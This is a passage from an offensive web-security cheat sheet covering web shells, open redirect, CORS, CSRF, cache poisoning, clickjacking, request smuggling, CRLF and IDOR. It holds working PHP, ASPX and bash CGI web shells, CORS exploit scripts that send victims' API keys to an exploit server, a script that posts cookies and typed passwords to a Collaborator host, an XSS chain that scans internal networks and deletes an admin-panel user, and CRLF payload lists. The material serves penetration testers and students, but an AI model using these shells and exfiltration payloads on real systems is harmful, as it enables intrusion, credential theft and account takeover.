CURL http://ip/shell.php?1=whoami
www.somewebsite.com/index.html?1=ipconfig

# passthru 


# NINJA
;").($_^"/"); ?> 
http://target.com/path/to/shell.php?=function&=argument
http://target.com/path/to/shell.php?=system&=ls

# NINJA 2
/'^'{{{{';@${$_}[_](@${$_}[__]);
```

### **.NET**

```text
<%@Page Language=”C#”%><%var p=new System.Diagnostics.Process{StartInfo={FileName=Request[“c”],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%><%=p.StandardOutput.ReadToEnd()%>
www.somewebsite.com/cgi-bin/a?ls%20/var
```

### **BASH**

```text
#!/bin/sh
echo;$_ `${QUERY_STRING/%20/ }`
www.somewebsite.com/cgi-bin/a?ls%20/var
```

## Open Redirect

```text
https://web.com/r/?url=https://phising-malicious.com
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect

- Search in Burp:
“=http” or “=aHR0”（base64 encode http）

- Reflected parameters:
url
rurl
u
next
link
lnk
go
target
dest
destination
redir
redirect_uri
redirect_url
redirect
r
view
loginto
image_url
return
returnTo
return_to
continue
return_path
path

- Dom based:
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
domElem.srcdoc
jQuery.ajax()
$.ajax()
XMLHttpRequest.open()
XMLHttpRequest.send()
```

## CORS

```text
**Tools**
# https://github.com/s0md3v/Corsy
python3 corsy.py -u https://example.com

# https://github.com/chenjj/CORScanner
python cors_scan.py -u example.com

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain based attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.

| URL accessed | Access permitted? |
| http://normal-website.com/example/ | Yes: same scheme, domain, and port |
| http://normal-website.com/example2/ | Yes: same scheme, domain, and port |
| https://normal-website.com/example/ | No: different scheme and port |
| http://en.normal-website.com/example/ | No: different domain |
| http://www.normal-website.com/example/ | No: different domain |
| http://normal-website.com:8080/example/ | No: different port* |


There are various exceptions to the same-origin policy:
• Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
• Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
• The replace function can generally be called cross-domain on the location object.
• You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.

Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.

CORS good example:
https://hackerone.com/reports/235200

- CORS with basic origin reflection:

    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com
    Observe that the origin is reflected in the Access-Control-Allow-Origin header.
    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab and test it by clicking "view exploit":
    <script>
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','$url/accountDetails',true);
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='/log?key='+this.responseText;
       };
    </script>
    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

 - Whitelisted null origin value

     With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "My account".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
    Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab, $exploit-server-url with the exploit server URL, and test it by clicking "view exploit":
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
       var req = new XMLHttpRequest ();
       req.onload = reqListener;
       req.open('get','$url/accountDetails',true);
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
       };
    </script>"></iframe>
    Notice the use of an iframe sandbox as this generates a null origin request. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

- CORS with insecure certificate

    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
    Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
    Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain.
    Observe that the productID parameter is vulnerable to XSS.
    Now browse to the exploit server, enter the following HTML, replacing $your-lab-url with your unique lab URL and $exploit-server-url with your exploit server URL and test it by clicking "view exploit":
    <script>
       document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>
    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

- CORS with pivot attack

Step 1
First we need to scan the local network for the endpoint. Replace $collaboratorPayload with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then "Deliver exploit to victim". Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
Step 2
Clear the code from stage 1 and enter the following code in the exploit server. Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with foundXSS=1 in the URL or you will see foundXSS=1 in the log.
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>

Step 3
Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
Step 4
Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an iframe pointing to the /admin page.
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
  }
  ))
}

fetchUrl("http://$ip");
</script>
Click on "Deliver exploit to victim" to submit the code. Once you have submitted the form to delete user carlos then you have completed the lab.

# JSONP

In GET URL append “?callback=testjsonp”
Response should be:
testjsonp(<json-data>)
```

### **CORS PoC**

```text
<!DOCTYPE html>
<html>
<head>
<title>CORS PoC Exploit</title>
</head>
<body>
<center>

<h1>CORS Exploit<br>six2dez</h1>
<hr>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script type="text/javascript">
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if(this.readyState == 4 && this.status == 200) {
        document.getElementById("demo").innerHTML = this.responseText;
     }
   };
 xhttp.open("GET", "http://<vulnerable-url>", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
</script>

</center>
</body>
</html>
```

### **CORS PoC 2**

```text
<html>
<script>
var http = new XMLHttpRequest();
var url = 'Url';//Paste here Url
var params = 'PostData';//Paste here POST data
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);

</script>
</html>
```

### **CORS JSON PoC**

```text
<!DOCTYPE html>
<html>
<head>
<title>JSONP PoC</title>
</head>
<body>
<center>

<h1>JSONP Exploit<br>secureITmania</h1>
<hr>
<div id="demo">
<button type="button" onclick="trigger()">Exploit</button>
</div>
<script>

function testjsonp(myObj) {
  var result = JSON.stringify(myObj)
  document.getElementById("demo").innerHTML = result;
  //console.log(myObj)
}

</script>

<script >

  function trigger() {
    var s = document.createElement("script");
    s.src = "https://<vulnerable-endpoint>?callback=testjsonp";
    document.body.appendChild(s);
}

</script>
</body>
</html>
```

## CSRF

```text
Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.

3 conditions:
• A relevant action
• Cookie-based session handling
• No unpredictable request parameters

Vulnerable request example:
__
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
__

HTML with attack:
__
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
__

Exploit CSRF in POST:

With your browser proxying traffic through Burp Suite, log in to your account, submit the "Change email" form, and find the resulting request in your Proxy history.
If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

Exploit CSRF in GET:
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">

- SameSite cookie property avoid the attack:
   → Only from same site:
    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict; 
   → From other site only if GET and requested by click, not scripts (vulnerable if CSRF in GET or POST converted to GET):    
    SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax; 


<script>
fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### **Json CSRF**

```text
Requirements:

1. The authentication mechanism should be in the cookie-based model. (By default cookie-based authentication is vulnerable to CSRF attacks)
2. The HTTP request should not be fortify by the custom random token on the header as well in the body.(X-Auth-Token)
3. The HTTP request should not be fortify by the Same Origin Policy.

Bypass 2 & 3:
• Change the request method to GET append the body as query parameter.
• Test the request without the Customized Token (X-Auth-Token) and also header.
• Test the request with exact same length but different token.

If post is not allowed, can try with URL/param?_method=PUT


<body onload='document.forms[0].submit()'>
<form action="https://<vulnerable-url>?_method=PUT" method="POST" enctype="text/plain">
  <input type="text" name='{"username":"blob","dummy":"' value='"}'>
  <input type="submit" value="send">
</form>

<!---This results in a request body of:
{"username":"blob", "dummy": "="} -->
```

### **CSRF Token Bypass**

```text
CSRF Tokens

Unpredictable value generated from the server to the client, when a second request is made, server validate this token and reject the request if is missing or invalid. Prevent CSRF attack because the malicious HTTP request formed can't know the CSRF Token generated for the victim.
   → Is transmited to the client through a hidden field:


- Example:
    __
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

    csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com
    __

- Validation depends on method (usually POST):
    __
    GET /email/change?email=pwned@evil-user.net HTTP/1.1
    Host: vulnerable-website.com
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
    __

- Validation depend on token is present (if not, validation is skipped):
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 25
    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

    email=pwned@evil-user.net
    --
- CSRF not tied to user session

- CSRF tied to a non-session cookie:
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

    csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
    --

- CSRF token duplicated in cookie:
    --
    POST /email/change HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 68
    Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

    csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
    --

- Validation of referer depends on header present (if not, validation is skipped)

- Circumvent referer validation (if only checks the domain existence)
```

## Web cache poisoning

```text
**Tools**
https://github.com/s0md3v/Arjun
python3 arjun.py -u https://url.com --get 
python3 arjun.py -u https://url.com --post

https://portswigger.net/research/practical-web-cache-poisoning

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users.

Fundamentally, web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.

A poisoned web cache can potentially be a devastating means of distributing numerous different attacks, exploiting vulnerabilities such as XSS, JavaScript injection, open redirection, and so on.

- XSS for users accessing /en?region=uk:
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```

## Broken Links

```text
**Tools** 
https://github.com/stevenvachon/broken-link-checker 
blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/
```

## Virtual Hosts

```text
**Tools** 
https://github.com/jobertabma/virtual-host-discovery
ruby scan.rb --ip=192.168.1.101 --host=domain.tld
```

## ClickJacking

```text
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

- Preventions:
   → X-Frame-Options: deny/sameorigin/allow-from
   → CSP: policy/frame-ancestors ‘none/self/website.com’

 An example using the style tag and parameters is as follows:
<head>
  <style>
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
...
<body>
  <div id="decoy_website">
  ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>

The target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values. Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform. The z-index determines the stacking order of the iframe and website layers. The opacity value is defined as 0.0 (or close to 0.0) so that the iframe content is transparent to the user. Browser clickjacking protection might apply threshold-based iframe transparency detection (for example, Chrome version 76 includes this behavior but Firefox does not). The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors.
```

## Request smuggling

```text
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

- The Content-Length header is straightforward: it specifies the length of the message body in bytes. For example:

    POST /search HTTP/1.1
    Host: normal-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 11

    q=smuggling

- The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

    POST /search HTTP/1.1
    Host: normal-website.com
    Content-Type: application/x-www-form-urlencoded
    Transfer-Encoding: chunked

    b
    q=smuggling
    0



• CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
   ◇ Find - time delay:
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 4

    1
    A
    X
• TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
   ◇ Find time delay:
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 6

    0

    X
• TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

- CL.TE
    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: your-lab-id.web-security-academy.net
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    G
    The second response should say: Unrecognized method GPOST.

 - TE.CL
    In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: your-lab-id.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked

    5c
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0

 - TE.TE: obfuscating TE Header
     In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
    Using Burp Repeater, issue the following request twice:
    POST / HTTP/1.1
    Host: your-lab-id.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Content-length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: cow

    5c
    GPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15

    x=1
    0
```

## Web Sockets

```text
WebSockets are a bi-directional, full duplex communications protocol initiated over HTTP. They are commonly used in modern web applications for streaming data and other asynchronous traffic.

WebSocket connections are normally created using client-side JavaScript like the following:
var ws = new WebSocket("wss://normal-website.com/chat");

To establish the connection, the browser and server perform a WebSocket handshake over HTTP. The browser issues a WebSocket handshake request like the following:
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket

If the server accepts the connection, it returns a WebSocket handshake response like the following:
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=

Several features of the WebSocket handshake messages are worth noting:
• The Connection and Upgrade headers in the request and response indicate that this is a WebSocket handshake.
• The Sec-WebSocket-Version request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
• The Sec-WebSocket-Key request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
• The Sec-WebSocket-Accept response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.
```

## CRLF

```text
**Tools**
https://github.com/random-robbie/CRLF-Injection-Scanner
crlf_scan.py -i <inputfile> -o <outputfile>

The following simplified example uses CRLF to:

1. Add a fake HTTP response header: Content-Length: 0. This causes the web browser to treat this as a terminated response and begin parsing a new response.
2. Add a fake HTTP response: HTTP/1.1 200 OK. This begins the new response.
3. Add another fake HTTP response header: Content-Type: text/html. This is needed for the web browser to properly parse the content.
4. Add yet another fake HTTP response header: Content-Length: 25. This causes the web browser to only parse the next 25 bytes.
5. Add page content with an XSS: <script>alert(1)</script>. This content has exactly 25 bytes.
6. Because of the Content-Length header, the web browser ignores the original content that comes from the web server.

    http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

- Cloudflare CRLF bypass
<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>

Payload list:

/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
```

## IDOR

```text
Check for valuable words:
{regex + perm} id
{regex + perm} user
{regex + perm} account
{regex + perm} number
{regex + perm} order
{regex + perm} no
{regex + perm} doc
{regex + perm} key
{regex + perm} email
{regex + perm} group
{regex + perm} profile
{regex + perm} edit
```

